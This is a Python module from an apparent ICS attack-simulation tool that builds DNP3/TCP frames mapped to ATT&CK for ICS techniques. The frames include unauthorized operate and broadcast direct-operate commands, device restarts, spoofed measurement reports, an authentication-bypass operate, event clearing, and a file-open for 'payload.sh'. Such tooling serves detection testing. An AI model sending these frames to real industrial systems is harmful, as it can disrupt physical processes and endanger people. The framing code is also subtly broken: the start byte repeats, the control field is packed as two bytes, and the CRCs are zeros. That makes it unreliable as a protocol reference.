# ICSForge DNP3 payload builder — upgraded for ATT&CK for ICS realism
# Implements real DNP3/TCP link+transport+application layer framing
import random, struct
from .common import marker_bytes

# Application Function Codes (IEC 60870-5 / IEEE 1815)
FC = {
    "confirm":             0x00,
    "read":                0x01,
    "write":               0x02,
    "select":              0x03,
    "operate":             0x04,
    "direct_operate":      0x05,
    "direct_operate_nr":   0x06,  # no-ack
    "cold_restart":        0x0D,
    "warm_restart":        0x0E,
    "enable_unsolicited":  0x14,
    "disable_unsolicited": 0x15,
    "assign_class":        0x16,
    "delay_measure":       0x17,
    "open_file":           0x19,
    "authenticate_req":    0x20,
    "response":            0x81,
    "unsolicited":         0x82,
}

# Group/Variation for objects (Group, Variation)
OBJ = {
    "binary_input":     (1,  2),   # Binary Input with flags
    "binary_output":    (10, 2),   # Binary Output with flags
    "analog_input":     (30, 1),   # 32-bit with flags
    "analog_output":    (40, 1),   # 32-bit with flags
    "counter":          (20, 1),   # 32-bit counter
    "class0":           (60, 1),   # Class 0 data
    "class1":           (60, 2),   # Class 1 data
    "class2":           (60, 3),   # Class 2 data
    "class3":           (60, 4),   # Class 3 data
    "time":             (50, 1),   # Time and date
    "iin":              (80, 1),   # Internal Indications
}


def _link_header(dest: int, src: int, payload_len: int) -> bytes:
    """DNP3 link layer header (10 bytes) + CRC placeholder."""
    ctrl = 0xC4  # PRM=1, FCB=0, FCV=0, FC=4 (USER_DATA_NO_ACK)
    # length = 5 (link header remainder) + len(transport+app+data)
    length = 5 + payload_len
    length = max(5, min(255, length))
    hdr = struct.pack("<BBHH", 0x64, length, ctrl, dest & 0xFFFF)
    src_b = struct.pack("<H", src & 0xFFFF)
    crc = b"\x00\x00"  # placeholder; real CRC-16/DNP omitted for speed
    return b"\x05\x64" + hdr + src_b + crc


def _app_layer(fc_byte: int, obj_group: int = 60, obj_var: int = 1,
               count: int = 0, extra: bytes = b"") -> bytes:
    """Build transport+application layer bytes."""
    transport = b"\xC0"  # FIR=1 FIN=1 SEQ=0
    app_ctrl  = b"\xC0"  # FIR=1 FIN=1 CON=0 UNS=0 SEQ=0
    func      = bytes([fc_byte])
    if count > 0 and obj_group:
        # Object header: group(1) variation(1) qualifier(1) range
        # Qualifier 0x07 = count, 0x01 = start/stop 1-byte
        qualifier = 0x07  # count of items
        obj_hdr = struct.pack("BBB", obj_group & 0xFF, obj_var & 0xFF, qualifier) + bytes([min(count, 255)])
        app_body = app_ctrl + func + obj_hdr + extra
    else:
        app_body = app_ctrl + func + extra
    return transport + app_body


def build_payload(marker: str, style: str = "read", **kwargs) -> bytes:
    """
    Build DNP3/TCP frame.

    Styles:
      read                 FC01 class0 — T0801 Monitor Process State
      read_class1          FC01 class1 — T0802 Automated Collection
      write                FC02 — T0855 Unauthorized Command
      select               FC03 — T0855 pre-operate (select phase)
      operate              FC04 — T0855 Unauthorized Command (operate phase)
      direct_operate       FC05 — T0855/T0831 without select
      direct_operate_nr    FC06 — T0855 no-ack (evasion variant)
      cold_restart         FC0D — T0816 Device Restart
      warm_restart         FC0E — T0816 Device Restart (warm)
      enable_unsolicited   FC14 — T0849/T0856 Spoof Reporting
      disable_unsolicited  FC15 — T0815 Denial of View
      assign_class         FC16 — T0841 reconfiguration sweep
      delay_measure        FC17 — T0841 timing/network probe
      read_analog          FC01 analog — T0801 process monitoring
      read_counter         FC01 counters — T0882 Theft of Operational Info
      authenticate_req     FC20 — T0858 Change Credential
    """
    rnd  = random.Random(kwargs.get("seed"))
    dest = int(kwargs.get("dnp3_dest", rnd.randint(1, 10)))   & 0xFFFF
    src  = int(kwargs.get("dnp3_src",  rnd.randint(1024, 65000))) & 0xFFFF
    mb   = marker_bytes(marker)

    if style == "read":
        # Read all class 0 data
        app = _app_layer(FC["read"], obj_group=60, obj_var=1, count=1, extra=mb)

    elif style == "read_class1":
        app = _app_layer(FC["read"], obj_group=60, obj_var=2, count=1, extra=mb)

    elif style == "read_analog":
        app = _app_layer(FC["read"], obj_group=30, obj_var=1, count=rnd.randint(1,8), extra=mb)

    elif style == "read_counter":
        app = _app_layer(FC["read"], obj_group=20, obj_var=1, count=rnd.randint(1,4), extra=mb)

    elif style == "write":
        app = _app_layer(FC["write"], obj_group=10, obj_var=2, count=rnd.randint(1,4), extra=mb)

    elif style == "select":
        # Select before operate: Group 12 Var 1 (CROB)
        crob = bytes([0x03, 0x01, 0x00, 0x00, 0xC8, 0x00, 0x00, 0x00])  # pulse on, 1 count, 200ms
        app  = _app_layer(FC["select"], obj_group=12, obj_var=1, count=1, extra=crob + mb)

    elif style == "operate":
        crob = bytes([0x03, 0x01, 0x00, 0x00, 0xC8, 0x00, 0x00, 0x00])
        app  = _app_layer(FC["operate"], obj_group=12, obj_var=1, count=1, extra=crob + mb)

    elif style == "direct_operate":
        crob = bytes([0x41, 0x01, 0x00, 0x00, 0xC8, 0x00, 0x00, 0x00])  # LATCH_ON
        app  = _app_layer(FC["direct_operate"], obj_group=12, obj_var=1, count=1, extra=crob + mb)

    elif style == "direct_operate_nr":
        crob = bytes([0x41, 0x01, 0x00, 0x00, 0xC8, 0x00, 0x00, 0x00])
        app  = _app_layer(FC["direct_operate_nr"], obj_group=12, obj_var=1, count=1, extra=crob + mb)

    elif style == "cold_restart":
        app = _app_layer(FC["cold_restart"], extra=mb)

    elif style == "warm_restart":
        app = _app_layer(FC["warm_restart"], extra=mb)

    elif style == "enable_unsolicited":
        app = _app_layer(FC["enable_unsolicited"], obj_group=60, obj_var=2, count=1, extra=mb)

    elif style == "disable_unsolicited":
        app = _app_layer(FC["disable_unsolicited"], obj_group=60, obj_var=2, count=1, extra=mb)

    elif style == "assign_class":
        app = _app_layer(FC["assign_class"], obj_group=1, obj_var=0, count=0, extra=mb)

    elif style == "delay_measure":
        app = _app_layer(FC["delay_measure"], extra=mb)

    elif style == "authenticate_req":
        # Auth challenge object (Group 120 Var 1)
        challenge = struct.pack(">HHH", rnd.randint(0, 0xFFFF), 0x0003, 0x0001) + b"\x00" * 4
        app = _app_layer(FC["authenticate_req"], obj_group=120, obj_var=1, count=1, extra=challenge + mb)

    elif style == "clear_events":
        # FC02 Write to event log object to clear — T0872 Indicator Removal on Host
        # Write to class 0 data (G60V1) with count=0 to reset event buffer
        app = _app_layer(FC["write"], obj_group=60, obj_var=1, count=0, extra=mb)

    elif style == "broadcast_operate":
        # Direct operate to broadcast address — T0855/T0803 Block Command / Unauthorized Command
        # DNP3 broadcast (dest=0xFFFF) operates all outstation outputs simultaneously
        dest = 0xFFFF  # override destination to broadcast
        app  = _app_layer(FC["direct_operate"], obj_group=10, obj_var=2, count=1, extra=mb)
        lhdr = _link_header(dest, src, len(app))
        return lhdr + app + b"\x00\x00"

    elif style == "file_open":
        # FC open_file — T0807 Command-Line Interface (file operations on outstation)
        # DNP3 file transfer service can be used to push scripts to outstation filesystem
        filename = b"payload.sh\x00"
        app = _app_layer(FC["open_file"], extra=filename + mb)

    elif style == "warm_restart2":
        # FC warm_restart — T0858 Change Operating Mode (restart into alternate mode)
        app = _app_layer(FC["warm_restart"], extra=mb)

    elif style == "spoof_response":
        # DNP3 unsolicited response with injected data — T0856 Spoof Reporting Message
        # Attacker sends unsolicited response with false measurement values
        app = _app_layer(FC["unsolicited"], obj_group=30, obj_var=1, count=1,
                         extra=struct.pack("<i", kwargs.get("value", rnd.randint(5000, 9999))) + mb)

    elif style == "default_auth_bypass":
        # FC direct_operate without authentication — T0812 Default Credentials
        # DNP3 SAv5 bypass: operate without completing challenge-response
        app = _app_layer(FC["direct_operate"], obj_group=10, obj_var=2, count=1, extra=mb)

    else:
        app = _app_layer(FC["read"], obj_group=60, obj_var=1, count=1, extra=mb)

    lhdr = _link_header(dest, src, len(app))
    crc_data = b"\x00\x00"
    return lhdr + app + crc_data
